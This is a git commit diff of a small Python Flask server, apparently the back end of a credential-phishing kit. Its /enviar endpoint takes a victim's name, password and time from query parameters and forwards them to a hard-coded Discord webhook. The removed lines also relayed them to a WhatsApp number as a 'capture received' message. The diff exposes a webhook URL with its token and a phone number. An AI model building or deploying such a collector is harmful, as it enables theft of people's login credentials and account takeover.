333ebdbfc52da5a6201c050abc807f9f72169018
temporaltime93 <temporaltime93@gmail.com>
2025-07-25 00:04:57 -0500

    Update main.py

--- main.py
+++ main.py
@@ -3,46 +3,38 @@ import threading
 import requests
 from flask import Flask, request
 from flask_cors import CORS
-from whatsapp_web_api import iniciar_bot, enviar_mensaje
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1379160851432341695/xya9f3wHLQIfu6n7Fw8Lp70xrFHlbBDXTXNrdqVGzK98mZTZpV1AO18cLuISiWgwoP7L"  # tu webhook real
-NUMERO_DESTINO = "51949760700"  # número destino en formato internacional
+# ===================== 🔧 CONFIGURACIÓN ======================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1379160851432341695/xya9f3wHLQIfu6n7Fw8Lp70xrFHlbBDXTXNrdqVGzK98mZTZpV1AO18cLuISiWgwoP7L"
 
 app = Flask(__name__)
 CORS(app)
 
-def enviar_a_discord(nombre, passwd, hora):
-    mensaje = {
-        "content": f"""Nombre: {nombre}
-Pass: {passwd}
-Hora: {hora}"""
-    }
+def mensaje(NOMBRE, PASS, HORA):
+
+    EMBEB = {
+        "content": f"""Nombre: {NOMBRE}
+Pass: {PASS}
+Hora: {HORA}""",
+}
+
     try:
-        resp = requests.post(WEBHOOK_URL, json=mensaje)
-        return resp.status_code in (200, 204)
+        resp = requests.post(WEBHOOK_URL, json=EMBEB)
+        if resp.status_code in (200, 204):
+            return "✅ Mensaje enviado", 200
+        else:
+            return f"❌ Error al enviar mensaje: {resp.status_code}\n{resp.text}", 500
     except Exception as e:
-        print("❌ Error Discord:", str(e))
-        return False
+        return f"❌ Error en el servidor: {str(e)}", 500
 
 @app.route("/enviar", methods=["GET"])
 def enviar():
-    nombre = request.args.get("NOMBRE", "")
-    passwd = request.args.get("PASS", "")
-    hora   = request.args.get("HORA", "")
+    NOMBRE = request.args.get("NOMBRE", "")
+    PASS = request.args.get("PASS", "")
+    HORA = request.args.get("HORA", "")
 
-    ok_discord = enviar_a_discord(nombre, passwd, hora)
+    return mensaje(NOMBRE, PASS, HORA)
 
-    mensaje_whatsapp = f"📦 Captura recibida\n👤 Nombre: {nombre}\n🔑 Pass: {passwd}\n⏰ Hora: {hora}"
-    ok_whatsapp = enviar_mensaje(NUMERO_DESTINO, mensaje_whatsapp)
-
-    return {
-        "discord": ok_discord,
-        "whatsapp": ok_whatsapp
-    }, 200 if ok_discord and ok_whatsapp else 500
 
 if __name__ == "__main__":
-    # Inicializa el bot de WhatsApp en un hilo aparte
-    threading.Thread(target=iniciar_bot).start()
-
-    # Ejecuta la API en el puerto 3000
     app.run(host="0.0.0.0", port=3000)
